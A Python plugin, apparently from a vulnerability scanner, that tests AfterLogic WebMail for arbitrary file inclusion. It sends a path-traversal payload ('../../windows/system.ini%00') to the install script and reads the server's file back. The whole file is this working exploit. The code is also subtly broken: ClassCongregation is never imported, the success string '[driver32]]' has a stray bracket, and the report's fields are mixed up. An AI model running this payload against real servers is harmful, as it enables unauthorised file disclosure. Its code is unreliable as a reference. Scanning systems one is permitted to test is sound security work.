# coding: utf-8

import requests
import urllib.parse

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" 
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['createDate'] = "2020-1-18"  # 插件编辑时间
        self.info['disclosure']='2015-11-25'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "AfterLogic_WebMail"  # 插件名称
        self.info['name'] ='AfterLogic WebMail 任意文件包含' #漏洞名称
        self.info['affects'] = "AfterLogic_WebMail"  # 漏洞组件
        self.info['desc_content'] = "AfterLogic WebMail 任意文件包含"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = ""  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

      

        

def UrlProcessing(url):
    if url.startswith("http"):
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = "/install/index.php?post=1"
        payload_url = scheme + "://" + url +":"+ str(port)+ payload


        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        s = requests.session()
        resp = s.post(payload_url,
                      data={"state":"../../../../../../../../../../windows/system.ini%00"},
                      headers=headers, timeout=6, verify=False)
        con = resp.text
        code = resp.status_code
        if code == 200 and con.find('[driver32]]') !=-1 :
        
            Medusa = "{}存在AfterLogic_WebMail任意文件包含漏洞\r\n 验证数据:\r\nUrl:{}\r\nPayload:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            web=ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()
            return (str(_t.info))
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _) 



if __name__ == '__main__':
    medusa("http://127.0.0.1","","")
